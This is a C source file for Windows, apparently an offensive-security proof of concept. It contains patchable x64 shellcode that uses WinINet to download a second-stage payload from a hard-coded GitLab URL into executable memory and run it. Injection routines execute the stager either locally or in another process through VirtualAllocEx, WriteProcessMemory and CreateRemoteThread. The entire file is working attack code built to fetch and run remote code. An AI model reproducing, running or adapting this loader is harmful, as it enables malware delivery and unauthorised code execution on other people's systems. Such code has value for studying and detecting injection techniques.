#include <Windows.h>
#include <stdio.h>


typedef unsigned long long uint64_t;
typedef unsigned int       uint32_t;

#define PAYLOAD_LINK "https://gitlab.com/ORCA000/d.rdynamicshellcode/-/raw/main/calc.ico?inline=false"		// url to the payload
#define PAYLOAD_SIZE 0x110				//272																// the size of the payload
#define ALLOCSIZE	 0x100																					// how much space i will allocate for the shellcode		
#define LOCAL																								// if defined , execution = local, else = remote process



unsigned char Shellcode[217] = {

	0x48, 0x83, 0xEC, 0x38,

	0x68, 0x74, 0x73, 0x65, 0x74,
	0x6A, 0x00,
	0x48 ,0x8B, 0xCC,
	0x33, 0xD2,
	0x45, 0x33, 0xC0,
	0x45, 0x33, 0xC9,
	0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
	0x48, 0xB8, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,				// * InternetOpenA (33)
	0xFF, 0xD0,
	0x48, 0x89, 0x44, 0x24, 0x30,


	0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
	0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x44, 0x00, 0x80,
	0x45, 0x33, 0xC9,
	0x45, 0x33, 0xC0,
	0x48, 0xBA,													
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,				// * PAYLOAD_LINK (74)
	0x48, 0x8B, 0x4C, 0x24, 0x30,
	0x48, 0xB8, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,				// * InternetOpenUrlA (89)
	0xFF, 0xD0,
	0x48, 0x89, 0x44, 0x24, 0x28,



	0x41, 0xB9, 0x40, 0x00, 0x00, 0x00,
	0x41, 0xB8, 0x00, 0x30, 0x00, 0x00,
	0xBA,														
	0x00, 0x00, 0x00, 0x00,										// * PAYLOAD_SIZE (117)
	0x33, 0xC9,
	0x48, 0xB8,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,				// * VirtualAlloc (125)
	0xFF, 0xD0,
	0x48, 0x89, 0x44, 0x24, 0x20,


	0x4C, 0x8B, 0xCC,											
	0x41, 0xB8,													
	0x00, 0x00, 0x00, 0x00,										// * PAYLOAD_SIZE (145)
	0x48, 0x8B, 0x54, 0x24, 0x20,
	0x48, 0x8B, 0x4C, 0x24, 0x28,
	0x48, 0xB8,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,				// * InternetReadFile (161)
	0xFF, 0xD0,


	0x48, 0x8B, 0x4C, 0x24, 0x28,
	0x48, 0xB8,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,				// * InternetCloseHandle (178)
	0xFF, 0xD0,
	
	0x48, 0x8B, 0x4C, 0x24, 0x30,
	0x48, 0xB8,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,				// * InternetCloseHandle (195)
	0xFF, 0xD0,

	0x48, 0x8B, 0x44, 0x24, 0x20,
	0xFF, 0xD0,
	
	0x48, 0x83, 0xC4, 0x38,
	0xC3
};


BOOL PatchShellcode(PBYTE pUrl, SIZE_T PayloadSize) {

	const int pUrl_offset					= 74;
	const int pSize_offset1					= 117;
	const int pSize_offset2					= 145;
	const int pInternetOpenA_offset			= 33;
	const int pInternetOpenUrlA_offset		= 89;
	const int pVirtualAlloc_offset			= 125;
	const int pInternetReadFile_offset		= 161;
	const int pInternetCloseHandle_offset1	= 178;
	const int pInternetCloseHandle_offset2	= 195;


	uint64_t ppUrl = (uint64_t)(pUrl);
	memcpy(&Shellcode[pUrl_offset], &ppUrl, sizeof(ppUrl));


	uint32_t pSize = (uint32_t)PayloadSize;
	memcpy(&Shellcode[pSize_offset1], &pSize, sizeof(pSize));
	memcpy(&Shellcode[pSize_offset2], &pSize, sizeof(pSize));

	if (LoadLibraryA("Wininet.dll") == NULL) {
		return FALSE;
	}

	uint64_t pInternetOpenA = (uint64_t)GetProcAddress(GetModuleHandleA("Wininet.dll"), "InternetOpenA");
	uint64_t pInternetOpenUrlA = (uint64_t)GetProcAddress(GetModuleHandleA("Wininet.dll"), "InternetOpenUrlA");
	uint64_t pVirtualAlloc = (uint64_t)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "VirtualAlloc");
	uint64_t pInternetReadFile = (uint64_t)GetProcAddress(GetModuleHandleA("Wininet.dll"), "InternetReadFile");
	uint64_t pInternetCloseHandle = (uint64_t)GetProcAddress(GetModuleHandleA("Wininet.dll"), "InternetCloseHandle");


	if (pInternetOpenA == NULL	||
		pInternetOpenUrlA == NULL ||
		pVirtualAlloc == NULL ||
		pInternetReadFile == NULL ||
		pInternetCloseHandle == NULL ){

		return FALSE;
	}

	memcpy(&Shellcode[pInternetOpenA_offset], &pInternetOpenA, sizeof(pInternetOpenA));
	memcpy(&Shellcode[pInternetOpenUrlA_offset], &pInternetOpenUrlA, sizeof(pInternetOpenUrlA));

	memcpy(&Shellcode[pVirtualAlloc_offset], &pVirtualAlloc, sizeof(pVirtualAlloc));
	memcpy(&Shellcode[pInternetReadFile_offset], &pInternetReadFile, sizeof(pInternetReadFile));

	memcpy(&Shellcode[pInternetCloseHandle_offset1], &pInternetCloseHandle, sizeof(pInternetCloseHandle));
	memcpy(&Shellcode[pInternetCloseHandle_offset2], &pInternetCloseHandle, sizeof(pInternetCloseHandle));

	return TRUE;
}



VOID LocalInjection() {
	PVOID pAddress = NULL;
	if ((pAddress = VirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
		return;
	}
	memcpy(pAddress, Shellcode, sizeof(Shellcode));
	printf("[+] %s : 0x%p \n", "pAddress", pAddress);
	(*(void(*)())pAddress)();
}


BOOL Remote(HANDLE hProc) {
	/* Note that the new process must have wininet loaded (runtimebroker processes can have it already) */
	PVOID pAddress = NULL;

	if ((pAddress = VirtualAllocEx(hProc, NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
		return FALSE;
	}
	
	printf("[+] %s : 0x%p \n", "pAddress", pAddress);

	if (!WriteProcessMemory(hProc, pAddress, PAYLOAD_LINK, sizeof(PAYLOAD_LINK), NULL)) {
		return FALSE;
	}

	printf("[i] Pathcing The Shellcode ... ");
	if (!PatchShellcode(pAddress, PAYLOAD_SIZE)) {
		printf("[-] ERROR \n");
		return FALSE;
	}
	printf("[+] DONE \n");


	pAddress = (ULONG_PTR)pAddress + sizeof(PAYLOAD_LINK) + 1;
	
	if (!WriteProcessMemory(hProc, pAddress, Shellcode, sizeof(Shellcode), NULL)) {
		return FALSE;
	}

	//printf("[+] %s : 0x%p \n", "pAddress", pAddress);

	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pAddress, NULL, NULL, NULL);
	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}



int main() {

	printf("[+] %s : 0x%p \n", "Shellcode", (PVOID)Shellcode);

	
#ifdef LOCAL
	printf("[i] Pathcing The Shellcode ... ");
	if (!PatchShellcode(&PAYLOAD_LINK, PAYLOAD_SIZE)) {
		printf("[-] ERROR \n");
		return -1;
	}
	printf("[+] DONE \n");
#endif // LOCAL
	
	printf("[+] Press <Enter> To Run  ...");
	getchar();

	
#ifdef LOCAL
	LocalInjection();
#else
	if (!Remote((HANDLE)-1)) {
		return -1;
	};
#endif // LOCAL

	
	return 0;
}
